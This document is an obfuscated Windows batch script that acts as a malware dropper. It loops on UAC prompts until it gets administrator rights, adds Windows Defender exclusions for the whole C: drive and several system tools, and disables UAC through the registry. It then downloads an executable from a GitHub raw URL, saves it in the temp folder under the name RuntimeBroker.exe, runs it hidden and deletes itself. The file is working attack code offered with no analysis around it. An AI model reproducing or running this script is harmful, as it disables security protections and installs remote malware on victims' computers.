@echo off & setlocal enableDelayedExpansion
set "EaWNO=2>&1" & set "iWqu=>nul" & set "JWdG=SESSION" & set "ScS=NET"
%ScS% %JWdG% %iWqu% %EaWNO%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "mHtkU=baz" & set "oowv=qux" & set "qfPVH=foo" & set "OAfif=bar" & rem dQZYrGd JgZSE Dsx
set "qwfE=powershell -ExecutionPolicy Bypass -Command"
set "NsZE=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "RFYYy='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "Mns='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!qwfE! "!NsZE! !RFYYy! !Mns!" %iWqu% %EaWNO%
set "uGudo=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "CLvCp=-Name 'EnableLUA' -Value 0"
!qwfE! "!uGudo! !CLvCp!" %iWqu% %EaWNO%
set "kYmno=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!qwfE! "!kYmno!" %iWqu% %EaWNO%
if !errorlevel! neq 0 (goto %a%)
set "mDd=timeout /t" & !mDd! 2 %iWqu% %EaWNO%
set "TaxhG=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "cfcKB=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "nVi=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!qwfE! "!TaxhG! !cfcKB! !nVi!" %iWqu% %EaWNO%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!mDd! 1 %iWqu% %EaWNO% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %iWqu% %EaWNO%
del /f /q "%~f0" %iWqu% %EaWNO%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %iWqu% %EaWNO%
if !errorlevel! neq 0 (!mDd! 3 %iWqu% %EaWNO% & goto %b%)
exit /b
